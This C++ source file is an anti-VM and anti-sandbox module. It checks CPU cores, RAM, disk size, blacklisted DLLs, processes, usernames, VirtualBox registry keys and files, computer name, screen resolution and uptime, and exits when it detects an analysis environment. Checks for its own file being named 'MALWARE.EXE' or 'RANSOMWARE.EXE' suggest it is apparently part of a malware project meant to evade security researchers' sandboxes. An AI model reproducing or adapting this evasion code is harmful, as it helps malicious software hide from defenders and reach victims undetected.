#include "AntiVM.h"
#include "AntiVM.h"
#include "config.h"
#include "utils.h"




namespace AntiVM 
{


	void CheckForCPUCores()
	{
		SYSTEM_INFO sysInfo;
		GetSystemInfo(&sysInfo);

		DWORD PrCount = sysInfo.dwNumberOfProcessors;

		if (PrCount <= 4)
		{
			exit(EXIT_FAILURE);
		}
	}


	void CheckForRamSize()
	{
		MEMORYSTATUSEX memoryStatus;
		memoryStatus.dwLength = sizeof(MEMORYSTATUSEX);

		GlobalMemoryStatusEx(&memoryStatus);
		DWORDLONG RAMGB = memoryStatus.ullTotalPhys / 1024 / 1024 / 1024;

		if (RAMGB <= 4) 
		{
			
			exit(EXIT_FAILURE);
		}


	}

	
	void CheckForHHDSize()
	{
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive1",0,FILE_SHARE_READ | FILE_SHARE_WRITE ,NULL,OPEN_EXISTING, 0, NULL
		);

		if (hDevice == INVALID_HANDLE_VALUE)
		{
			utils::DebuggerVerbos();

		}

		DISK_GEOMETRY PDiskGeo;
		DWORD BytesRrts;

		DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0,
			&PDiskGeo, sizeof(PDiskGeo),
			&BytesRrts, (LPOVERLAPPED)NULL);


		DWORDLONG diskSizeGB;
		diskSizeGB = PDiskGeo.Cylinders.QuadPart* 
			(ULONG)PDiskGeo.TracksPerCylinder* 
			(ULONG)PDiskGeo.SectorsPerTrack* 
			(ULONG)PDiskGeo.BytesPerSector / 1024 / 1024 / 1024;
		
		if (diskSizeGB < 102)
		{
			CloseHandle(hDevice);
			exit(EXIT_FAILURE);
		}

		
	}


	
	void CheckForRunningModule()
	{
		HMODULE ModeDll;

		DWORD ModuleLen = ARRAY_LENGTH(BlackListDLL);

		unsigned int i;

		for (i = 0; i < ModuleLen; i++)
		{
			ModeDll = GetModuleHandle(BlackListDLL[i]);

			if (ModeDll != NULL)
			{
				
				exit(EXIT_FAILURE);
			}
			
		}

	}

	void CheckForBlackListPorc()
	{
		DWORD ProcId = 0;

		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		if (hSnap == INVALID_HANDLE_VALUE)
		{
			
		}

		PROCESSENTRY32 pE;
		pE.dwSize = sizeof(pE);

		if (Process32First(hSnap, &pE))
		{
			if (!pE.th32ProcessID)
			{
				Process32Next(hSnap, &pE);
			}

			do 
			{
				_bstr_t b(pE.szExeFile);

				for (int i = 0; i < ARRAYSIZE(BlackListProccVM); i++)
				{
					if (!_stricmp((const char*)b, BlackListProccVM[i]))
					{
						CloseHandle(hSnap);
						exit(EXIT_FAILURE);
					}
				}

			} while (Process32Next(hSnap, &pE));
		}

		CloseHandle(hSnap);
	}

	void DirectoryChecker()
	{

		WIN32_FIND_DATAW findFileData;
		if (FindFirstFileW(L"C:\\Windows\\System32\\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE)
		{
			
			exit(EXIT_FAILURE);
		}



	}

	void registryChecker()
	{
		HKEY hkResult;
		DWORD mountedUSBDevicesCount;

		if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\VBoxSF", 0, KEY_QUERY_VALUE, &hkResult) == ERROR_SUCCESS)
		{
			
			exit(EXIT_FAILURE);
		}

		RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Enum\\USBSTOR", 0, KEY_READ, &hkResult);
		RegQueryInfoKey(hkResult, NULL, NULL, NULL, &mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL,
			NULL);

		if (mountedUSBDevicesCount < 1)
		{
			
			exit(EXIT_FAILURE);
		}



	}

	void CurrentProcChecker()
	{
		wchar_t CurrentPath[MAX_PATH + 1];
		GetModuleFileName(NULL, CurrentPath, MAX_PATH + 1);
		CharUpperW(CurrentPath);

		if (wcsstr(CurrentPath, L"MALWARE.EXE"))
		{
			
			exit(EXIT_FAILURE);
		}

		if (wcsstr(CurrentPath, L"RANSOMWARE.EXE"))
		{
			
			exit(EXIT_FAILURE);
		}
	}

	void VirtualDevices()
	{
		
		DWORD devLen = ARRAYSIZE(BlackListDevices);
		unsigned int i;

		for (i = 0; i < devLen; i++)
		{
			HANDLE hFile = CreateFile(BlackListDevices[i], 
				GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 
				FILE_ATTRIBUTE_NORMAL, NULL);

			if (hFile != INVALID_HANDLE_VALUE)
			{
				exit(2);
				
			}

			CloseHandle(hFile);
		}
	}


	TCHAR* GetCurrentUserName()
	{
		TCHAR* username;
		DWORD userSize = { UNLEN + 1 };

		username = (TCHAR*)malloc(userSize * sizeof(TCHAR));

		if (!username)
		{
			return NULL;
		}

		if (GetUserName(username, &userSize) == 0)
		{
			free(username);
			return 0;
		}
		return username;
	}

	void UsernamesChecker()
	{
		TCHAR* CurrentUser = GetCurrentUserName();
		unsigned int i;
		int flag = 0;

		if (CurrentUser == NULL)
		{
			return;
		}

		DWORD UsersListLen = ARRAYSIZE(BlackListUsersNames);

		for (i = 0; i < UsersListLen; i++)
		{
			if (!_tcsicmp(BlackListUsersNames[i], CurrentUser))
			{
				flag = 1;
			}
		}

		if (flag)
		{
			
			exit(EXIT_FAILURE);
		}

		free(CurrentUser);
	}

	BOOL Is_RegKeyValueExists(HKEY hKey, const TCHAR* lpSubKey, const TCHAR* lpValueName, const TCHAR* search_str)
	{
		HKEY hkResult = NULL;
		TCHAR lpData[1024] = { 0 };
		DWORD cbData = MAX_PATH;

		if (RegOpenKeyEx(hKey, lpSubKey, NULL, KEY_READ, &hkResult) == ERROR_SUCCESS)
		{
			if (RegQueryValueEx(hkResult, lpValueName, NULL, NULL, (LPBYTE)lpData, &cbData) == ERROR_SUCCESS)
			{
				if (StrStrI((PCTSTR)lpData, search_str) != NULL)
				{
					RegCloseKey(hkResult);
					return TRUE;
				}
			}
			RegCloseKey(hkResult);
		}
		return FALSE;

	}

	VOID vbox_reg_key_value()
	{

		const TCHAR* szEntries[][3] = {
			{ _T("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0"), _T("Identifier"), _T("VBOX") },
			{ _T("HARDWARE\\Description\\System"), _T("SystemBiosVersion"), _T("VBOX") },
			{ _T("HARDWARE\\Description\\System"), _T("VideoBiosVersion"), _T("VIRTUALBOX") },
			{ _T("HARDWARE\\Description\\System"), _T("SystemBiosDate"), _T("06/23/99") },
		};

		WORD dwLength = ARRAYSIZE(szEntries);

		for (int i = 0; i < dwLength; i++)
		{
			if (Is_RegKeyValueExists(HKEY_LOCAL_MACHINE, szEntries[i][0], szEntries[i][1], szEntries[i][2]))
			{
				
				exit(EXIT_FAILURE);
			}
				
		}

	}

	BOOL Is_RegKeyExists(HKEY hKey, const TCHAR* lpSubKey)
	{
		HKEY hkResult = NULL;
		TCHAR lpData[1024] = { 0 };
		DWORD cbData = MAX_PATH;

		if (RegOpenKeyEx(hKey, lpSubKey, NULL, KEY_READ, &hkResult) == ERROR_SUCCESS)
		{
			RegCloseKey(hkResult);
			return TRUE;
		}

		return FALSE;
	}

	VOID vbox_reg_keys()
	{
		/* Array of strings of blacklisted registry keys */
		const TCHAR* szKeys[] = {
			_T("HARDWARE\\ACPI\\DSDT\\VBOX__"),
			_T("HARDWARE\\ACPI\\FADT\\VBOX__"),
			_T("HARDWARE\\ACPI\\RSDT\\VBOX__"),
			_T("SOFTWARE\\Oracle\\VirtualBox Guest Additions"),
			_T("SYSTEM\\ControlSet001\\Services\\VBoxGuest"),
			_T("SYSTEM\\ControlSet001\\Services\\VBoxMouse"),
			_T("SYSTEM\\ControlSet001\\Services\\VBoxService"),
			_T("SYSTEM\\ControlSet001\\Services\\VBoxSF"),
			_T("SYSTEM\\ControlSet001\\Services\\VBoxVideo")
		};

		WORD dwlength = sizeof(szKeys) / sizeof(szKeys[0]);

		/* Check one by one */
		for (int i = 0; i < dwlength; i++)
		{
			TCHAR msg[256] = _T("");
			_stprintf_s(msg, sizeof(msg) / sizeof(TCHAR), _T("Checking reg key %s "), szKeys[i]);
			if (Is_RegKeyExists(HKEY_LOCAL_MACHINE, szKeys[i]))
			{
				
				exit(EXIT_FAILURE);
			}
				
		}
	}

	void ComputerNameChecker()
	{
		DWORD CmLen = MAX_COMPUTERNAME_LENGTH + 1;
		wchar_t CmName[MAX_COMPUTERNAME_LENGTH + 1];
		GetComputerNameW(CmName , &CmLen);
		CharUpperW(CmName);
		if (wcsstr(CmName, L"DESKTOP-"))
		{
			
			exit(EXIT_FAILURE);
		}

	}

	bool CALLBACK MyCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data)
	{
		MONITORINFO monitorInfo;
		monitorInfo.cbSize = sizeof(monitorInfo);

		if (GetMonitorInfoW(hMonitor, &monitorInfo) == 0)
		{
			return NULL;
		}

		int xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
		int yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;

		if (xResolution < 0) xResolution = -xResolution;
		if (yResolution < 0) yResolution = -yResolution;
		if ((xResolution != 1920 && xResolution != 2560 && xResolution != 1440)
			|| (yResolution != 1080 && yResolution != 1200 && yResolution != 1600 && yResolution != 900))
		{
			*((BOOL*)data) = true;
		}
		return true;
	}

	
	VOID ScreenResolution()
	{
		MONITORENUMPROC pMyCallback = (MONITORENUMPROC)MyCallback;
		int XResolution = GetSystemMetrics(SM_CXSCREEN);
		int YResolution = GetSystemMetrics(SM_CYSCREEN);

		std::cout << XResolution << " " << YResolution;
		
		if (XResolution < 100
			&& YResolution < 100)
		{
			
			exit(EXIT_FAILURE);
		}

		int numberOfMonitors = GetSystemMetrics(SM_CMONITORS);
		bool sandbox = false;
		EnumDisplayMonitors(NULL, NULL, pMyCallback, (LPARAM)(&sandbox));
		if (sandbox)
		{
			
			exit(EXIT_FAILURE);
		}
	}



	VOID UpTimers()
	{
		ULONGLONG upTime = GetTickCount64();

		if (upTime < 1500) 
		{
			
			exit(EXIT_FAILURE);
		}
	}


}
